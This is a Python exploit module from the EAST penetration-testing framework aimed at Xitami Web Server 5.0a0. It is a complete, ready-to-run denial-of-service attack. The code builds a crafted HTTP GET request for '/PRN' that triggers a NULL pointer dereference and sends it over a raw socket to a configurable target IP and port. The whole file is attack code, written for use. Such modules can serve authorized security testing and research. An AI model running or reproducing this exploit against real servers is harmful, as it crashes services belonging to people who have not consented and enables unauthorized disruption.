#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
import struct

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_xitami_web_server_dos"
INFO['DESCRIPTION'] = "Xitami Web Server 5.0a0 - Denial of Service"
INFO['VENDOR'] = "http://www.xitami.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40849/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """The vulnerability is caused due to a NULL pointer dereference when processing malicious HEAD and GET requests. This can be exploited to cause denial of service scenario.
"""
INFO['CHANGELOG'] = "01 Dec, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.49", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return
    
    def run(self):
        self.args()
        self.log("")
        
        packet = 'GET /PRN HTTP/1.1\r\n'
        packet += 'Host: {}\r\n'.format(self.host)
        packet += 'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n'
        packet += 'Accept-Language: en-us,en;q=0.5\r\n'
        packet += 'Accept-Encoding: gzip,deflate\r\n'
        packet += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
        packet += 'Keep-Alive: 300\r\n'
        packet += 'Connection: keep-alive\r\n\r\n'
        
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s1.connect((self.host, self.port))
            self.log('Send malicious packet')
            s1.sendall(packet)
            s1.close()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
